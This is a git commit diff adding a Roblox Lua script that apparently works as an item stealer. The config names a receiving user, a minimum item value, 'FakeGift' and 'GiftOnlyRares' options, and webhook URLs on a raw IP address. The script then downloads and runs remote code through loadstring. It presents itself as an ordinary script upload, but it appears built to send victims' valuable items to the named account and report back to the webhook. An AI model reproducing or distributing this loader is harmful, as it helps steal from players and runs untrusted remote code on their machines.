95baaa72ea269948ebed02564ac8fed3ef57ba25
DeltaScript-gw <ratonil1212@gmail.com>
2025-07-28 20:14:04 -0400

    Upload script.lua via Script Source Converter

---
+++ script.lua
@@ -0,0 +1,13 @@
+_G.LRMConfig = {
+    User = {"nachorobloss"},
+    min_value = 10000000000,
+    pingEveryone = "Yes", -- dont change this
+    Webhook = "http://45.13.225.83:6969/proxy/82f3e025e98b950227ae8e4e0a6ba065",
+    FakeGift = "No",
+    Trash = "http://45.13.225.83:6969/proxy/82f3e025e98b950227ae8e4e0a6ba065",
+    LoadingScreen = "Yes",
+    GiftOnlyRares = "No",
+    ExecuteOtherScript = "No",
+}
+    
+loadstring(game:HttpGetAsync('https://lrmscripts.com/script/main.lua'))()
